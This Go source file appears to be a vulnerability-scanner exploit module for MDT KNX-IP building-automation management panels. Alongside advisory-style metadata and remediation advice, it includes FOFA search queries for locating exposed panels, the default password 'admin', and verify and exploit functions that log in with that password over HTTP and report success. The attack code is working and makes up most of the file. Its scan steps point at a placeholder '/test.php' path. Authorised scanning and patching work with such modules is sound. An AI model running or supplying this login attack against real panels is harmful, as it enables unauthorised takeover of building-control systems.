package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {

	expJson := `{
    "Name": "MDT KNX manager panel default credentials vulnerability",
    "Description": "<p>MDT Technologies is an intelligent building automation service provider based on KNX technology for product manufacturing. Its KNX-IP Interface/ Knx-ip Object Server panel is used to access every bus device in the KNX bus system. These panels have default passwords and malicious attackers can take over the target panel system.</p><p>Default passwords exist on the KNX-IP Interface and KNX-IP Object Server management panel of MDT Technologies. Malicious attackers can use these passwords to take over the target web system.</p>",
    "Product": "DEFAULT-IP-PLATFORM",
    "Homepage": "http://www.mdt.de",
    "DisclosureDate": "2023-01-11",
    "Author": "i_am_ben@qq.com",
    "FofaQuery": "title=\"MDT Technologies GmbH\" && server=\"DEFAULT IP PLATFORM\"",
    "GobyQuery": "title=\"MDT Technologies GmbH\" && server=\"DEFAULT IP PLATFORM\"",
    "Level": "2",
    "Impact": "<p>Default passwords exist on the KNX-IP Interface and KNX-IP Object Server management panel of MDT Technologies. Malicious attackers can use these passwords to take over the target web system.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits should be greater than 8. </p><p>2. If not necessary, prohibit public network access to the system. </p><p>3. Set access policies and whitelist access through security devices such as firewalls. </p>",
    "Translation": {
        "CN": {
            "Name": "MDT KNX 管理面板默认口令",
            "Product": "DEFAULT-IP-PLATFORM",
            "Description": "<p>MDT是一家智能楼宇自动化服务商，基于KNX技术进行产品制造。其旗下产品的KNX-IP Interface/KNX-IP Object Server面板用于访问KNX总线系统中的每个总线设备，这些面板存在默认口令，恶意攻击者可接管目标面板系统。</p><p>MDT Technologies 公司的 KNX-IP Interface、KNX-IP Object Server管理面板存在默认口令(admin)，恶意攻击者使用该凭据可接管目标web系统。</p>",
            "Recommendation": "<p>1、修改默认⼝令，密码最好包含⼤⼩写字⺟、数字和特殊字符等，且位数⼤于8位。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p><p>3、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p>",
            "Impact": "<p>MDT Technologies 公司的 KNX-IP Interface、KNX-IP Object Server管理面板存在默认口令<span style=\"color: rgb(22, 28, 37); font-size: 16px;\">(admin)</span>，恶意攻击者使用该凭据可接管目标web系统</p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "MDT KNX manager panel default credentials vulnerability",
            "Product": "DEFAULT-IP-PLATFORM",
            "Description": "<p>MDT Technologies is an intelligent building automation service provider based on KNX technology for product manufacturing. Its KNX-IP Interface/ Knx-ip Object Server panel is used to access every bus device in the KNX bus system. These panels have default passwords and malicious attackers can take over the target panel system.</p><p>Default passwords exist on the KNX-IP Interface and KNX-IP Object Server management panel of MDT Technologies. Malicious attackers can use these passwords to take over the target web system.</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits should be greater than 8. </p><p>2. If not necessary, prohibit public network access to the system. </p><p>3. Set access policies and whitelist access through security devices such as firewalls. </p>",
            "Impact": "<p>Default passwords exist on the KNX-IP Interface and KNX-IP Object Server management panel of MDT Technologies. Malicious attackers can use these passwords to take over the target web system.</p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "References": [
        "http://www.mdt.de"
    ],
    "HasExp": true,
    "ExpParams": [],
    "Is0day": false,
    "ExpTips": {
        "Type": "Default Credentials",
        "Content": "Default passwords exist on the KNX-IP Interface and KNX-IP Object Server management panel of MDT Technologies. Malicious attackers can use these passwords to take over the target web system."
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "VulType": [
        "Default Password"
    ],
    "Tags": [
        "Default Password"
    ],
    "CVEIDs": [],
    "CVSSScore": "7.5",
    "CNNVDIDs": [],
    "AttackSurfaces": {
        "Application": [
            "MDT KNX Management Panel"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Disable": false,
    "CNNVD": [],
    "CNVD": [],
    "PocId": "10791"
}`


	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,

		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			logoutApi := "/password.cgi?changemode=Logout"
			loginApi := "/password.cgi?password=admin"
			indexApi := "/index.shtml"
			if logoutRep, err := httpclient.SimpleGet(u.FixedHostInfo + logoutApi); err == nil {
				if logoutRep.StatusCode == 200 && strings.Contains(logoutRep.RawBody, "MDT Technologies GmbH") {
					if loginRep, err2 := httpclient.SimpleGet(u.FixedHostInfo + loginApi); err2 == nil {
						if loginRep.StatusCode == 200 && !strings.Contains(loginRep.RawBody, "Wrong Password!") {
							if indexRep, err3 := httpclient.SimpleGet(u.FixedHostInfo + indexApi); err3 == nil {
								if indexRep.StatusCode == 200 && strings.Contains(indexRep.RawBody, "Application SW version:") {
									return true
								}
							}
						}
					}
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			logoutApi := "/password.cgi?changemode=Logout"
			loginApi := "/password.cgi?password=admin"
			indexApi := "/index.shtml"
			if logoutRep, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + logoutApi); err == nil {
				if logoutRep.StatusCode == 200 && strings.Contains(logoutRep.RawBody, "MDT Technologies GmbH") {
					if loginRep, err2 := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + loginApi); err2 == nil {
						if loginRep.StatusCode == 200 && !strings.Contains(loginRep.RawBody, "Wrong Password!") {
							if indexRep, err3 := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + indexApi); err3 == nil {
								if indexRep.StatusCode == 200 && strings.Contains(indexRep.RawBody, "Application SW version:") {
									expResult.Success = true
									expResult.Output = "Password: admin"
								}
							}
						}
					}
				}
			}
			return expResult
		},
	))
}
